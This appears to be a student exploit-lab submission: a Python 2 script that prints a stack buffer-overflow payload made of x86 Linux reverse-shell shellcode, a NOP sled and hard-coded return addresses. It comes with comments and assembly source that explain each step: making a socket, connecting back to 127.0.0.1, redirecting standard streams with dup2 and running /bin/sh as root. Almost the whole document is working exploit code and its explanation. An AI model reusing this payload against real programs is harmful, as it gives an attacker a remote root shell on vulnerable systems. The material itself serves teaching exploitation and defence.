from struct import pack

shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xff\x57\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x6a\x03\x5b\x31\xc9\x83\xc1\xff\x81\xf1\xff\xff\xff\xfe\x83\xc1\x7f\x51\x66\x68\x7a\x69\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x6a\x3f\x58\x89\xf3\x89\xf9\xcd\x80\x6a\x3f\x58\x41\xcd\x80\x6a\x3f\x58\x41\xcd\x80\x6a\x0b\x58\x57\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x57\x53\x89\xe1\x89\xfa\xcd\x80"

print shellcode + '\x90'*1946 + pack("<I",0xbffeec58) + pack("<I",0xbffef46c)


############

#Annotation
#1: First, the shellcode calls sys_socketcall by putting 0x66 in eax with an argument to in ebx to call sys_socket
#1: By pushing the correct arguments on the stack, when socket is called a socket is made with parameters we want. 
#1: After the function returns, we need to save the pointer to the socket descriptor we created for future reference
#2: Next, sys_socketcall is put into eax again and this time ebx is set to call sys_connect.
#2: In sys_connect we have to specify the IP address as 127.0.0.1 in a struct
#2: To do this, ecx is xor'd with itself to set it to 0x00000000.
#2: Then, ecx adds 0xffffffff to set it to 0xffffffff.
#2: Then, ecx is xor'd with 0xfeffffff to set it to 0x01000000.
#2: Then ecx has 0x7f added to it to make it 0x0100007f, making it 127.0.0.1 in big endian.
#2: This effort is necessary to avoid 0x00 being in the hex code as that would terminate string copy
#2: Then, arguments are pushed onto the stack refering to a structure that is an argument to connect
#2: A pointer to this struct is moved into ecx and the arguments to connect are pushed on the stack
#2: Then, connect is called through sys_socketcall
#3: After this, 3 calls to sys_dup2 are completed.
#3: This is done to redirect stdin, stdout, and stderr to the terminal that created the socket we connected to.
#4: Then, execve is run with parameters pushed onto the stack to make it run root shell.
#4: Since the input and output was redirected, the terminal that created the socket can now use the root shell.

#5 (optional):Now we run commands as root and pwn the box! l33t h4x!

#Shellcode
#.global your_asm_fn
#.section .text

#your_asm_fn:

#//make socket
#push $0x66
#pop %eax

#push $0x1
#pop %ebx

#xor %edi,%edi 

#push %edi
#push $0x1
#push $0x2

#mov %esp,%ecx

#int $0x80

#mov %eax,%esi

#//connect socket
#push $0x66
#pop %eax

#push $0x3
#pop %ebx

#xor %ecx,%ecx
#add $0xffffffff,%ecx
#xor $0xfeffffff,%ecx
#add $0x7f,%ecx

#push %ecx
#pushw $0x697A
#pushw $0x02
#mov %esp,%ecx

#push $0x10
#push %ecx
#push %esi

#mov %esp,%ecx

#int $0x80

#//redirct std..
#push $0x3f
#pop %eax
#mov %esi,%ebx
#mov %edi,%ecx

#int $0x80

#push $0x3f
#pop %eax
#inc %ecx

#int $0x80

#push $0x3f
#pop %eax
#inc %ecx

#int $0x80

#push $0xb
#pop %eax
#push %edi
#push $0x68732f2f
#push $0x6e69622f
#mov %esp,%ebx
#push %edi
#push %ebx
#mov %esp,%ecx
#mov %edi,%edx


############
